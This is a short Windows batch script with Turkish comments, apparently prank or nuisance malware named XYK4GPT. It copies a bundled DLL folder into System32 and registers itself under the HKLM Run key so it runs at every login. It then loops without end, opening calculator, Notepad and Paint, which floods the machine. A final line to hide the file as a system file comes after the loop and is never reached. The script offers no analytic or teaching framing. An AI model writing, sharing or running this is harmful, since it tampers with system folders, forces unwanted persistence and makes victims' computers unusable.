@echo off

:: dlls klasörünü System32'ye kopyala
xcopy /s /y "%~dp0dlls" "C:\Windows\System32"

:: Kayıt defteri girişi oluştur
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "XYK4GPT" /t REG_SZ /d "%~dp0XYK4GPT.bat" /f

:: Rastgele uygulamalar aç
:loop
start "" "C:\Windows\System32\calc.exe"
start "" "C:\Windows\System32\notepad.exe"
start "" "C:\Windows\System32\mspaint.exe"
goto loop

:: Kendi dosyasını gizle
attrib +h +s "%~dp0XYK4GPT.bat"
